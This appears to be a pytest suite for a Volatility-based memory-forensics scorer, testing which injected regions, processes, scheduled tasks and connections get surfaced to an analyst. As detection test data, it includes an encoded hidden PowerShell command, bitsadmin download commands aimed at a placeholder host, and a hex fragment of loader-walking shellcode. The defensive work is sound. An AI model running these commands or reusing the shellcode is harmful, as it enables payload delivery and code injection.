"""The step scorers, against rows shaped like Volatility 3 actually emits them.

These rules surface signal for an analyst. They are not detections, and none of
these tests assert that something is or is not malicious -- only that the noisy
cases stay below the surfacing threshold and the distinctive ones clear it.
"""
from __future__ import annotations

import pytest

from volmemlyzer.analysis import OverviewAnalysis
from volmemlyzer.utilities import is_suspicious_path


def hexdump(data: bytes) -> str:
    """Volatility's JSON form for a LayerData column: space-separated hex pairs."""
    return " ".join(f"{b:02x}" for b in data)


@pytest.fixture
def eng():
    return OverviewAnalysis()


# --------------------------------------------------------------------------
# malfind
# --------------------------------------------------------------------------

def test_an_unreadable_region_does_not_take_the_step_down(eng):
    """Volatility writes the literal "N/A" when it could not read the region."""
    assert eng._score_injections({"Hexdump": "N/A", "Protection": "PAGE_NOACCESS"}) == (
        0, "", "—")


@pytest.mark.parametrize("value", [None, float("nan"), 123, ""])
def test_a_missing_hexdump_is_not_an_error(eng, value):
    assert eng._hexdump_bytes(value) == b""


def test_a_real_hexdump_round_trips(eng):
    assert eng._hexdump_bytes(hexdump(b"MZ\x90\x00")) == b"MZ\x90\x00"


def test_an_empty_region_is_not_a_finding(eng):
    """Volatility reports plenty of these; they were scored as if they held code."""
    score, _, why = eng._score_injections({
        "Hexdump": hexdump(b"\x00" * 64),
        "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1})
    assert score == 0 and "zero" in why


def test_a_bare_private_executable_region_stays_below_the_threshold(eng):
    """Nearly every malfind row looks like this; JIT engines produce them freely."""
    score, _, _ = eng._score_injections({
        "Hexdump": hexdump(b"\x48\x89\x5c\x24\x08" + b"\x33" * 59),
        "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1})
    assert score < eng._threshold("malfind")


@pytest.mark.parametrize("data,flag", [
    (b"MZ\x90\x00" + b"\x41" * 60, "PE"),
    (b"\x90" * 16 + b"\xcc" * 48, "SLED"),
    (b"\xfc\xe8\x8f\x00\x00\x00" + b"\x60" * 58, "STUB"),
])
def test_distinctive_region_contents_surface(eng, data, flag):
    score, flags, _ = eng._score_injections({
        "Hexdump": hexdump(data),
        "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1})
    assert flag in flags
    assert score >= eng._threshold("malfind")


def test_scoring_does_not_depend_on_capstone(eng):
    """Capstone is an optional extra, so the Disasm column may be assembly text or
    a byte dump depending on the install. Scoring must not change either way."""
    region = {"Hexdump": hexdump(b"MZ\x90\x00" + b"\x41" * 60),
              "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1}
    with_asm = dict(region, Disasm="\n0x0:\tpush\tebp\n0x1:\tmov\tebp, esp")
    without = dict(region, Disasm="4d 5a 90 00")
    assert eng._score_injections(with_asm) == eng._score_injections(without)


# --------------------------------------------------------------------------
# process census
# --------------------------------------------------------------------------

def _census(*procs):
    out = {}
    for pid, name, ppid, path in procs:
        out[pid] = {"pid": pid, "name": name, "ppid": ppid, "path": path, "wow64": None}
    return out


SYS = "C:\\Windows\\System32"


def test_a_normal_windows_boot_produces_no_findings(eng):
    census = _census(
        (4, "System", None, ""),
        (400, "smss.exe", 4, f"{SYS}\\smss.exe"),
        (500, "csrss.exe", 400, f"{SYS}\\csrss.exe"),
        (600, "wininit.exe", 400, f"{SYS}\\wininit.exe"),
        (700, "services.exe", 600, f"{SYS}\\services.exe"),
        (800, "lsass.exe", 600, f"{SYS}\\lsass.exe"),
        (900, "svchost.exe", 700, f"{SYS}\\svchost.exe"),
        (1000, "RuntimeBroker.exe", 900, f"{SYS}\\RuntimeBroker.exe"),
        (1100, "ApplicationFrameHost.exe", 900, f"{SYS}\\ApplicationFrameHost.exe"),
    )
    summary, rows = eng._score_processes(census, psscan=[], psxview=None)
    assert rows == [], f"the operating system booting normally was flagged: {rows}"
    assert summary["psxview_inconsistent"] is None


def test_services_exe_under_wininit_is_not_a_finding(eng):
    """It used to score 8 with a rationale claiming a suspicious path."""
    census = _census((600, "wininit.exe", 400, f"{SYS}\\wininit.exe"),
                     (700, "services.exe", 600, f"{SYS}\\services.exe"))
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    assert rows == []


def test_an_orphan_is_scored_once(eng):
    """Two rules used to test the same condition, so orphans carried 12-14 points
    and a duplicated ZB flag."""
    census = _census((1234, "thing.exe", 9999, f"{SYS}\\thing.exe"))
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    # Below the surfacing threshold on its own, and flagged exactly once.
    scored = eng._score_processes(census, [], None)
    assert scored[1] == [] or scored[1][0][4].count("ZB") == 1


def test_pid_zero_is_the_kernel_root_not_an_orphan(eng):
    census = _census((4, "System", 0, ""))
    summary, rows = eng._score_processes(census, psscan=[], psxview=None)
    assert summary["orphans"] == 0
    assert rows == []


def test_each_pid_appears_at_most_once(eng):
    census = _census((1, "a.exe", None, "C:\\Users\\u\\Downloads\\a.exe"),
                     (2, "b.exe", 1, "C:\\Users\\u\\Desktop\\b.exe"))
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    pids = [r[0] for r in rows]
    assert len(pids) == len(set(pids))


def test_a_live_process_only_pool_scan_can_see_surfaces(eng):
    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
    _, rows = eng._score_processes(census, psscan=[{"PID": 6666, "ExitTime": None}], psxview=None)
    assert any(r[0] == 6666 and "HK" in r[4] for r in rows)


def test_a_terminated_process_is_ordinary_churn(eng):
    """Every image has dozens of these; they must not read like hidden processes."""
    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
    summary, rows = eng._score_processes(
        census, psscan=[{"PID": 6666, "ExitTime": "2024-01-01T00:00:00"}], psxview=None)
    assert not any(r[0] == 6666 for r in rows)
    assert summary["hidden_count"] == 0
    assert summary["terminated_count"] == 1


def test_a_system_name_outside_a_system_path_surfaces(eng):
    census = _census((1234, "svchost.exe", 900, "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe"))
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    assert rows and "IMP" in rows[0][4]


def test_a_near_miss_system_name_surfaces(eng):
    census = _census((1234, "svch0st.exe", 900, f"{SYS}\\svch0st.exe"))
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    assert rows and "LOOK" in rows[0][4]


def test_script_interpreter_launching_external_native_child_surfaces(eng):
    census = _census(
        (5048, "powershell.exe", 1000, f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe"),
        (7936, "malware.exe", 5048, "Z:\\malware.exe"),
    )
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    child = next(row for row in rows if row[0] == 7936)
    assert "SCRIPT_CHILD_EXTERNAL" in child[4]
    assert child[3] in {"Medium", "High", "Critical"}


def test_script_interpreter_with_standard_install_child_is_not_the_external_rule(eng):
    census = _census(
        (5048, "powershell.exe", 1000, f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe"),
        (6000, "python.exe", 5048, "C:\\Program Files\\Python\\python.exe"),
    )
    _, rows = eng._score_processes(census, psscan=[], psxview=None)
    assert not any("SCRIPT_CHILD_EXTERNAL" in row[4] for row in rows)


def test_one_psxview_disagreement_is_not_enough(eng):
    """A process that has exited is legitimately absent from one source."""
    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
    psx = [{"PID": 900, "pslist": True, "psscan": True, "thrdscan": False, "csrss": True}]
    summary, rows = eng._score_processes(census, psscan=[], psxview=psx)
    assert summary["psxview_inconsistent"] == 0
    assert not any("XV" in r[4] for r in rows)


def test_two_psxview_disagreements_surface(eng):
    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
    psx = [{"PID": 900, "pslist": False, "psscan": True, "thrdscan": False, "csrss": True}]
    summary, rows = eng._score_processes(census, psscan=[], psxview=psx)
    assert summary["psxview_inconsistent"] == 1
    assert any("XV" in r[4] for r in rows)


def test_wow64_false_is_not_read_as_a_discovery_disagreement(eng):
    """The old rule swept every boolean column, Wow64 included."""
    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
    psx = [{"PID": 900, "pslist": True, "psscan": True, "thrdscan": True,
            "csrss": True, "Wow64": False, "ExitTime": False}]
    summary, _ = eng._score_processes(census, psscan=[], psxview=psx)
    assert summary["psxview_inconsistent"] == 0


# --------------------------------------------------------------------------
# census construction
# --------------------------------------------------------------------------

def test_the_census_reaches_processes_nested_in_the_tree(eng):
    """pstree nests descendants under __children; only roots used to be read, so
    the path Volatility supplies never reached any path-based rule."""
    tree = [{"PID": 4, "PPID": 0, "ImageFileName": "System", "Path": None, "__children": [
        {"PID": 400, "PPID": 4, "ImageFileName": "smss.exe", "Path": f"{SYS}\\smss.exe",
         "__children": [
             {"PID": 500, "PPID": 400, "ImageFileName": "csrss.exe",
              "Path": f"{SYS}\\csrss.exe", "__children": []}]}]}]
    pslist = [{"PID": p, "PPID": q, "ImageFileName": n}
              for p, q, n in [(4, 0, "System"), (400, 4, "smss.exe"), (500, 400, "csrss.exe")]]
    census = eng._build_census(pslist, tree)
    assert census[500]["path"] == f"{SYS}\\csrss.exe"


def test_a_null_image_name_does_not_raise(eng):
    census = eng._build_census([{"PID": 9, "PPID": 1, "ImageFileName": None}], [])
    assert census[9]["name"] == ""


def test_the_command_line_stands_in_when_there_is_no_path(eng):
    tree = [{"PID": 7, "PPID": 1, "ImageFileName": "x.exe", "Path": None,
             "Cmd": "C:\\Users\\u\\Downloads\\x.exe -q", "__children": []}]
    census = eng._build_census([{"PID": 7, "PPID": 1, "ImageFileName": "x.exe"}], tree)
    assert "Downloads" in census[7]["path"]


# --------------------------------------------------------------------------
# paths
# --------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files (x86)\\Thing\\thing.exe",
    "C:\\Users\\alice\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
    "C:\\Users\\alice\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
])
def test_software_where_software_lives_is_not_suspicious(path):
    assert is_suspicious_path(path) is False


@pytest.mark.parametrize("path", [
    "C:\\Users\\alice\\AppData\\Local\\Temp\\x.exe",
    "C:\\Users\\alice\\Downloads\\invoice.exe",
    "C:\\Users\\Public\\a.exe",
    "C:\\Windows\\Temp\\x.exe",
    "C:\\$Recycle.Bin\\S-1-5-21\\x.exe",
])
def test_user_writable_scratch_space_is_suspicious(path):
    assert is_suspicious_path(path) is True


def test_an_empty_path_is_not_suspicious():
    assert is_suspicious_path("") is False


# --------------------------------------------------------------------------
# the ladder itself
# --------------------------------------------------------------------------

@pytest.mark.parametrize("score,band", [
    (0, "Low"), (8, "Low"), (9, "Medium"), (13, "Medium"),
    (14, "High"), (19, "High"), (20, "Critical"), (99, "Critical"),
])
def test_the_ladder_maps_scores_to_bands(eng, score, band):
    assert eng._risk_from_score(score) == band


def test_every_surface_threshold_sits_on_a_band_boundary(eng):
    """Otherwise a shown row could still be labelled below the band it cleared."""
    floors = {f for _, f in OverviewAnalysis.RISK_BANDS}
    for surface, value in OverviewAnalysis.SURFACE_THRESHOLDS.items():
        assert value in floors, f"{surface} threshold {value} is not a band floor"


def test_min_risk_raises_every_threshold(eng):
    low = OverviewAnalysis("low")
    high = OverviewAnalysis("high")
    for surface in OverviewAnalysis.SURFACE_THRESHOLDS:
        assert high._threshold(surface) >= low._threshold(surface)
        assert high._threshold(surface) >= OverviewAnalysis.MIN_RISK["high"]


def test_min_risk_filters_already_labelled_rows():
    eng = OverviewAnalysis("high")
    rows = [["a", "Low"], ["b", "Medium"], ["c", "High"], ["d", "Critical"]]
    assert [r[0] for r in eng._keep(rows, 1)] == ["c", "d"]


def test_high_level_is_the_same_knob_as_min_risk_high():
    eng = OverviewAnalysis()
    eng._min_risk = "high" if True else eng._min_risk
    assert eng._threshold("netscan") == OverviewAnalysis("high")._threshold("netscan")


# --------------------------------------------------------------------------
# network attribution and independent corroboration
# --------------------------------------------------------------------------

def _connection(**over):
    row = {
        "State": "ESTABLISHED", "Proto": "TCPv4",
        "LocalAddr": "10.0.0.5", "LocalPort": 50000,
        "ForeignAddr": "8.8.8.8", "ForeignPort": 443,
        "Owner": "", "PID": None,
        "_pid_conn_count": 1, "_same_remote_count": 1,
    }
    row.update(over)
    return row


def test_public_connection_without_pid_is_context_not_a_finding(eng):
    score, flags, _ = eng._score_network_connections(
        _connection(), eng._is_private_ip, eng._is_loopback)
    assert flags == ["PublicNoPID"]
    assert score < eng._threshold("netscan")


def test_unattributed_public_admin_connection_has_independent_corroboration(eng):
    score, flags, _ = eng._score_network_connections(
        _connection(ForeignPort=445), eng._is_private_ip, eng._is_loopback)
    assert {"PublicNoPID", "AdminPortOutbound", "EstablishedPublic"} <= set(flags)
    assert score >= eng._threshold("netscan")


# --------------------------------------------------------------------------
# scheduled tasks, against rows taken from a real Windows 10 image
#
# The machine these came from surfaced 286 of its 323 scheduled tasks as
# indicators. Almost all of them were Windows' own maintenance tasks, flagged
# because "%windir%\system32\..." could not be resolved on the analysis host and
# so read as a non-system path.
# --------------------------------------------------------------------------

def _task(name, action, args="", trigger="", principal="", enabled=True):
    return {"Task Name": name, "Action": action, "Action Arguments": args,
            "Trigger Type": trigger, "Principal ID": principal, "Enabled": enabled}


STOCK_TASKS = [
    _task("PcaWallpaperAppDetect", "%windir%\\system32\\rundll32.exe",
          "%windir%\\system32\\PcaSvc.dll,PcaWallpaperAppDetect", "Time", "Users"),
    _task("PcaPatchDbTask", "%windir%\\system32\\rundll32.exe",
          "%windir%\\system32\\PcaSvc.dll,PcaPatchSdbTask", "Time"),
    _task("Pre-staged app cleanup", "%windir%\\system32\\rundll32.exe",
          "%windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask", "Logon"),
    _task("Proxy", "%windir%\\system32\\rundll32.exe",
          "/d acproxy.dll,PerformAutochkOperations", "Boot"),
    _task("BfeOnServiceStartTypeChange", "%windir%\\system32\\rundll32.exe",
          "bfe.dll,BfeOnServiceStartTypeChange"),
    _task("Recovery-Check", "%SystemRoot%\\System32\\dsregcmd.exe",
          "/checkrecovery", "Logon", "InteractiveUsers"),
    _task("StartupAppTask", "%windir%\\system32\\rundll32.exe",
          "Startupscan.dll,SusRunTask", "", "Users", enabled=False),
    _task("Automatic-Device-Join", "%SystemRoot%\\System32\\dsregcmd.exe",
          "$(Arg0) $(Arg1) $(Arg2)", "Logon"),
]


@pytest.mark.parametrize("row", STOCK_TASKS, ids=lambda r: r["Task Name"])
def test_windows_own_maintenance_tasks_do_not_surface(eng, row):
    score, _ = eng._score_scheduled_task(row)
    assert score < eng._threshold("scheduled_tasks"), (
        f"{row['Task Name']} scored {score} and would be tabled")


def test_a_per_user_vendor_updater_does_not_surface(eng):
    """OneDrive genuinely installs under LocalAppData and updates on a schedule."""
    row = _task("OneDrive Reporting Task-S-1-5-21-2515051972",
                "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
                "", "Time")
    score, _ = eng._score_scheduled_task(row)
    assert score < eng._threshold("scheduled_tasks")


@pytest.mark.parametrize("name,script", [
    ("LOG", "C:\\Workspace\\export_logs.ps1"),
    ("PID", "C:\\Workspace\\log_pid.ps1"),
    ("UTG", "C:\\Workspace\\UTG\\launch.ps1"),
])
def test_a_powershell_script_run_at_logon_surfaces(eng, name, script):
    score, why = eng._score_scheduled_task(_task(name, "PowerShell", script, "Logon", "Author"))
    assert score >= eng._threshold("scheduled_tasks")
    assert eng._risk_from_score(score) in {"High", "Critical"}
    assert any("Script" in w for w in why)


def test_an_encoded_powershell_task_surfaces(eng):
    score, _ = eng._score_scheduled_task(
        _task("Updater", "powershell.exe", "-nop -w hidden -enc SQBFAFgA", "Logon"))
    assert score >= eng._threshold("scheduled_tasks")


def test_task_argument_rationales_do_not_call_every_switch_obfuscation(eng):
    _, why = eng._score_scheduled_task(
        _task("Updater", "powershell.exe", "-noprofile -windowstyle hidden"))
    assert "Hidden-window argument" in why
    assert "PowerShell profile loading disabled" not in why  # strongest payload signal wins
    assert not any("Obfuscat" in reason for reason in why)


def test_bits_transfer_is_named_as_transfer_not_obfuscation(eng):
    score, why = eng._score_scheduled_task(
        _task("Updater", "cmd.exe", "bitsadmin /transfer job https://example.test/a x"))
    assert score >= eng._threshold("scheduled_tasks")
    assert "BITS transfer command in arguments" in why
    assert not any("Obfuscat" in reason for reason in why)


def test_bits_action_with_transfer_arguments_surfaces(eng):
    score, why = eng._score_scheduled_task(
        _task("Updater", "C:\\Windows\\System32\\bitsadmin.exe",
              "/transfer job https://example.test/a C:\\Temp\\a"))
    assert score >= eng._threshold("scheduled_tasks")
    assert "BITS transfer command in arguments" in why


def test_bare_bitsadmin_action_is_not_called_a_transfer(eng):
    _, why = eng._score_scheduled_task(
        _task("Updater", "C:\\Windows\\System32\\bitsadmin.exe", "/list"))
    assert "BITS transfer command in arguments" not in why


# --------------------------------------------------------------------------
# UserAssist: execution location is corroboration, not a verdict
# --------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    r"D:\\virtio-win-guest-tools.exe",
    r"C:\\Users\\alice\\Downloads\\setup.exe",
    r"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe",
])
def test_userassist_location_alone_stays_below_surface_threshold(eng, path):
    score, _ = eng._score_userassist_name(path)
    assert score < eng._threshold("userassist")


def test_userassist_exact_known_tool_plus_location_surfaces(eng):
    score, why = eng._score_userassist_name(r"D:\\Packed\\pafish64.exe")
    assert score >= eng._threshold("userassist")
    assert any("known dual-use" in reason for reason in why)


def test_userassist_script_in_risky_location_surfaces(eng):
    score, why = eng._score_userassist_name(r"C:\\Users\\alice\\Downloads\\stage.ps1")
    assert score >= eng._threshold("userassist")
    assert "Script path" in why


# --------------------------------------------------------------------------
# SSDT integrity (deep-only)
# --------------------------------------------------------------------------

@pytest.mark.parametrize("module", [
    "ntoskrnl", "ntoskrnl.exe", "win32k.sys", "win32kbase.sys", "win32kfull.sys",
])
def test_expected_windows_ssdt_target_is_not_a_finding(eng, module):
    score, flag, _ = eng._score_ssdt_entry(
        {"Address": 0xFFFFF80000001000, "Index": 1, "Module": module,
         "Symbol": "NtOpenProcess"})
    assert (score, flag) == (0, "")


def test_foreign_ssdt_target_surfaces(eng):
    score, flag, why = eng._score_ssdt_entry(
        {"Address": 0xFFFFF80100001000, "Index": 1, "Module": "thirdparty.sys",
         "Symbol": "NtOpenProcess"})
    assert score >= eng._threshold("ssdt")
    assert flag == "SSDT_FOREIGN_MODULE"
    assert "thirdparty.sys" in why


def test_unresolved_ssdt_target_is_unknown_not_a_hook(eng):
    assert eng._score_ssdt_entry({"Module": "N/A", "Symbol": "", "Address": None})[0] == 0


def test_ssdt_is_only_scheduled_for_deep_kernel_analysis(eng):
    assert eng._plugins_for([5], deep=False) == []
    assert eng._plugins_for([5], deep=True) == ["ssdt"]


# --------------------------------------------------------------------------
# path classification must not depend on the machine running the analysis
# --------------------------------------------------------------------------

@pytest.mark.parametrize("path,expected", [
    ("%windir%\\system32\\rundll32.exe", False),
    ("%SystemRoot%\\System32\\dsregcmd.exe", False),
    ("%ProgramFiles%\\Thing\\thing.exe", False),
    ("%ProgramData%\\Thing\\thing.exe", False),
    ("%LOCALAPPDATA%\\Temp\\evil.exe", True),
    ("C:\\Workspace\\export_logs.ps1", True),
])
def test_windows_variables_resolve_without_a_windows_host(path, expected):
    """%windir% has no meaning in the environment of a macOS or Linux analyst, so
    resolving it from os.environ made the verdict depend on the analysis host."""
    from volmemlyzer.utilities import not_system_path
    assert not_system_path(path) is expected


def test_the_host_environment_cannot_change_the_verdict(monkeypatch):
    from volmemlyzer.utilities import not_system_path
    before = not_system_path("%windir%\\system32\\rundll32.exe")
    for var, value in [("WINDIR", "E:\\Windows"), ("SystemRoot", "E:\\Windows"),
                       ("SystemDrive", "E:"), ("ProgramFiles", "E:\\Program Files")]:
        monkeypatch.setenv(var, value)
    assert not_system_path("%windir%\\system32\\rundll32.exe") == before


# --------------------------------------------------------------------------
# malfind, against the nine regions a real Windows 10 image produced
#
# All nine are PAGE_EXECUTE_READWRITE and private, so the region's attributes
# alone cannot separate them -- every one scores identically on protection. What
# separates them is what the bytes do.
# --------------------------------------------------------------------------

RWX = {"Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1, "CommitCharge": 1}

# PID 2580, malware.exe: push ebp / mov ebp,esp / pusha, push fs + pop ds, the
# PEB->Ldr walk (8b 40 0c, 8b 70 1c, 8b 46 08, 8b 7e 20), then a pushed API hash.
SHELLCODE = bytes.fromhex(
    "558bec81c4e8feffff6083ec04832424001e0fa01f33c040d1e040c1e0048b001f"
    "8b400c8b701c33c98b46088b7e208b3666394f1875f268b2f2e2f46832749100")

# PID 5292, SearchHost.exe: mov rax,imm64 / jmp rax trampolines with cc padding.
JIT_TRAMPOLINE = bytes.fromhex(
    "48b80000001 09a01000048ffe0cccccc48b80010001 09a01000048ffe0cccccc"
    .replace(" ", "") + "48b80078011 09a01000048ffe0cccccc48b80030001 09a01000048ffe0cccccc"
    .replace(" ", ""))

# PID 5292, SearchHost.exe: an ordinary x64 prologue spilling its arguments.
JIT_METHOD = bytes.fromhex(
    "4889542410 48894c2408 4c89442418 4c894c2420 488b4128 488b4808 488b5150"
    .replace(" ", "") + "4883e2f8 488bca 48b86000787da2010000 482bc8 4881f9700f0000 7609 48c7c1"
    .replace(" ", ""))

# PID 5292, SearchHost.exe: relative jump thunks separated by cc padding.
JIT_THUNKS = bytes.fromhex(
    "e9fbff3a000000000 0cccccccccccccc".replace(" ", "") * 2)

# PID 3768, powershell.exe: a table of heap pointers, not code at all.
POINTER_TABLE = bytes.fromhex(
    "000000000000000010773a28690200001 0773a2869020000".replace(" ", "") +
    "00003a2869020000b00dd02969020000".ljust(32, "0"))


def _region(data: bytes, **over):
    row = dict(RWX, Hexdump=hexdump(data))
    row.update(over)
    return row


def test_the_shellcode_region_surfaces(eng):
    score, flags, _ = eng._score_injections(_region(SHELLCODE, CommitCharge=2))
    assert score >= eng._threshold("malfind")
    assert eng._risk_from_score(score) in {"High", "Critical"}
    assert "LDRWALK" in flags
    assert "SEG" not in flags  # weaker evidence from the same loader-behavior family


@pytest.mark.parametrize("data,label", [
    (JIT_TRAMPOLINE, "mov rax,imm64 / jmp rax trampolines"),
    (JIT_METHOD, "an ordinary x64 prologue"),
    (JIT_THUNKS, "relative jump thunks"),
    (POINTER_TABLE, "a table of heap pointers"),
])
def test_ordinary_private_executable_regions_do_not_surface(eng, data, label):
    """A JIT engine produces these by the dozen in every browser and .NET host."""
    score, _, _ = eng._score_injections(_region(data))
    assert score < eng._threshold("malfind"), f"{label} scored {score}"


def test_the_protection_flags_alone_never_reach_the_threshold(eng):
    """Otherwise every malfind row surfaces, since malfind only reports these."""
    score, _, _ = eng._score_injections(_region(b"\x33\xc0" + b"\x90" * 4 + b"\x11" * 58))
    assert score < eng._threshold("malfind")


def test_a_peb_walk_needs_more_than_one_field_access(eng):
    """Compiled code reaches structure fields the same way; one is meaningless."""
    assert eng._peb_walk(bytes.fromhex("8b400c") + b"\x00" * 32) is False
    assert eng._peb_walk(bytes.fromhex("8b400c") + bytes.fromhex("8b701c")) is True


def test_small_pushed_constants_are_not_read_as_hashes(eng):
    """push 0x10, push 0x100 -- lengths and flags, mostly zero bytes."""
    assert eng._api_hashing(bytes.fromhex("6810000000") * 3) == 0
    assert eng._api_hashing(bytes.fromhex("68b2f2e2f4")) == 1
